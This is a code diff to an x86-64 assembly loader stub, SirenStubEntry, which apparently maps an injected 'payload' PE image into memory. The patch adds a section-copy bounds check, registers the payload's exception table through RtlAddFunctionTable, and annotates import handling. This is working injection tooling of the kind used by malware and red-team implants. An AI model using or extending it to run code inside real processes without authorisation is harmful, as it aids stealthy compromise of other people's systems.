@@ -110,6 +110,14 @@ SirenStubEntry:
     jz   .Lsec_next
     push rbx
     push rsi
+    # Cap copy at VirtualSize to prevent buffer overflow
+    mov  ecx, [rsi + 0x08]
+    test ecx, ecx
+    jz   .Lsec_use_raw
+    cmp  ecx, eax
+    jae  .Lsec_use_raw
+    mov  eax, ecx
+.Lsec_use_raw:
     mov  edx, [rsi + 0x0C]
     mov  ecx, [rsi + 0x14]
     lea  rdi, [r14 + rdx]
@@ -167,14 +175,56 @@ SirenStubEntry:
     jmp  .Lreloc_blk
 .Lreloc_done:
 
-    /* S7 IMPORTS — skip if injector pre-resolved all IAT entries */
+    /* S6.5 EXCEPTION DIRECTORY — register .pdata via RtlAddFunctionTable.
+       Without this, any exception in the payload causes a process crash
+       because the OS has no RUNTIME_FUNCTION table for unwind.
+       NOTE: must use [rbp-0x60] (saved API module DllBase), NOT r12
+       (which was overwritten in S3 with the source PE base). */
+    mov  rcx, [rbp-0x60]
+    lea  rdx, [rip + .Lstr_RtlAddFuncTable]
+    call .Lexport_lookup
+    test rax, rax
+    jz   .Lexc_done
+    mov  [rbp-0x58], rax         /* RtlAddFunctionTable */
+
+    /* DataDirectory[3] = Exception Directory.
+       From NT headers: OptHdr + 0x88 = DataDirectory[3] (offset 0xA0 from r13). */
+    mov  eax, [r13 + 0xA0]       /* ExceptionDir RVA */
+    test eax, eax
+    jz   .Lexc_done
+    mov  ecx, [r13 + 0xA4]       /* ExceptionDir Size */
+    cmp  ecx, 12                  /* sizeof(RUNTIME_FUNCTION) = 12 */
+    jb   .Lexc_done
+
+    /* EntryCount = Size / 12 */
+    mov  eax, ecx
+    xor  edx, edx
+    mov  ecx, 12
+    div  ecx                     /* eax = EntryCount */
+    test eax, eax
+    jz   .Lexc_done
+    mov  r9d, eax                /* r9d = count (save) */
+
+    /* RtlAddFunctionTable(FunctionTable, EntryCount, BaseAddress) */
+    mov  eax, [r13 + 0xA0]       /* ExceptionDir RVA again */
+    lea  rcx, [r14 + rax]        /* 1st arg: table VA in loaded image */
+    mov  edx, r9d                /* 2nd arg: entry count */
+    mov  r8, r14                 /* 3rd arg: image base */
+    sub  rsp, 0x20
+    call [rbp-0x58]
+    add  rsp, 0x20
+.Lexc_done:
+
+    /* S7 IMPORTS — skip if injector pre-resolved all IAT entries
+       OptHdr DataDirectory[1] = Import Directory:
+         +0x90 = ImportDir.VirtualAddress */
     lea  r10, [rip + .Lskip_imports]
     cmp  byte ptr [r10], 0
     jne  .Limp_done
-    mov  eax, [r13 + 0x90]
+    mov  eax, [r13 + 0x90]            /* ImportDir RVA */
     test eax, eax
     jz   .Limp_done
-    lea  rsi, [r14 + rax]
+    lea  rsi, [r14 + rax]             /* rsi = first IMPORT_DESCRIPTOR */
 .Limp_desc:
     mov  eax, [rsi + 0x0C]
     test eax, eax
@@ -519,6 +569,8 @@ SirenStubEntry:
     .asciz "FlushInstructionCache"
 .Lstr_LoadLibraryA:
     .asciz "LoadLibraryA"
+.Lstr_RtlAddFuncTable:
+    .asciz "RtlAddFunctionTable"
 
     .align 16, 0x90
 siren_stub_end:
